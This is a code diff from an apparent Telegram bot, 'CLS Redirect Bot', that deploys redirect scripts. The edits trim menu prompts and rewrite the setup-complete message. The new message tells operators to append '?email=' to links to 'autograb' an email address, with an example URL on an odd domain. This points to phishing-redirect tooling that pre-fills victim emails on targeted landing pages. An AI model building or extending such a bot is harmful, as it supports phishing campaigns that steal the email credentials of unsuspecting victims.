@@ -297,8 +297,7 @@ if (bot) {
     );
 
     return ctx.reply(
-      `🚀 *Welcome to CLS Redirect Bot!*\n\n` +
-      `Choose an option from the menu below:`,
+      `🚀 *Welcome to CLS Redirect Bot!*`,
       { 
         parse_mode: "Markdown",
         reply_markup: {
@@ -580,8 +579,9 @@ if (bot) {
           `*Script URLs:*\n` +
           urls.map((url, index) => `${index + 1}. ${url}`).join("\n") +
           "\n\n" +
-          `✅ *Setup Complete!* Your redirect scripts are now live.\n` +
-          `⚠️ *Note:* Update your domain's nameservers if needed.`;
+          `✅ *Setup Complete!* Your redirect scripts are now live.\n\n` +
+          `📧 *Email Parameter:* Add ?email= to autpgrab email\n` +
+          `*Example:* www.ffgfg.info/0000.html?email=1o1@mono.com/{email}`;
 
         await ctx.reply(responseMessage, { parse_mode: "Markdown" });
 
@@ -925,8 +925,7 @@ if (bot) {
         Object.keys(session).forEach(key => delete session[key]);
 
         return ctx.editMessageText(
-          `🏠 *Main Menu*\n\n` +
-          `Choose an option:`,
+          `🏠 *Main Menu*`,
           { 
             parse_mode: "Markdown",
             reply_markup: {
